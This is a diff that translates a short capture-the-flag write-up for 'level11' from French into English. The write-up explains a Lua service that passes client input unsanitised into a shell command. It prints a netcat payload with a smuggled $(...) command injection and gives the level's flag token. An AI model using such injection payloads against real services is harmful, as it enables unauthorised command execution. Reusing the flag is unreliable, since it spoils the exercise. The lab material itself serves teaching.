@@ -1,42 +1,34 @@
 # level11
 
-1. Fichiers trouvés dans `~/` :
+1. Files found in `~/` :
 
 ```bash
 level11.lua
 ```
 
----
+2. Analysis of the `level11.lua` script
 
-2. Analyse rapide du script `level11.lua`
-
-* Le service écoute `127.0.0.1:5151` et lit une ligne fournie par le client.
-* Il exécute ensuite :
+The service listens on `127.0.0.1:5151` and reads a line provided by the client.
+It then executes :
 
 ```lua
 prog = io.popen("echo "..pass.." | sha1sum", "r")
 ```
 
-* Problème : la variable `pass` est **concaténée** directement dans une commande shell → **injection shell possible** (substitutions `$(...)`, backticks, `;`, redirections, etc.).
+Problem : the `pass` variable is **concatenated** directly into a shell command → **shell injection possible** (substitutions `$(...)`, backticks, `;`, redirections, etc.).
 
----
+3. Exploitation
 
-3. Vulnérabilité & objectif
-
-* Le processus s'exécute avec les droits de `flag11` → l'objectif est d'exécuter `/bin/getflag` côté serveur et d'écrire la sortie dans un fichier lisible par l'utilisateur.
-
----
-
-4. Exploitation
+The process executes with the rights of `flag11` → the objective is to execute `/bin/getflag` on the server side and write the output to a file readable by the user.
 
 ```bash
-# envoyer le payload au service (depuis la même machine, car le service bind 127.0.0.1)
+# send the payload to the service (from the same machine, as the service binds 127.0.0.1)
 echo '$(/bin/getflag > /tmp/flag11; chmod 644 /tmp/flag11)' | nc 127.0.0.1 5151
 
-# récupérer le token créé
+# retrieve the created token
 cat /tmp/flag11
 ```
 
-5. Token decouvert
+4. Token discovered
 
-Le token est `fa6v5ateaw21peobuub8ipe6s`
+The token is : `fa6v5ateaw21peobuub8ipe6s`
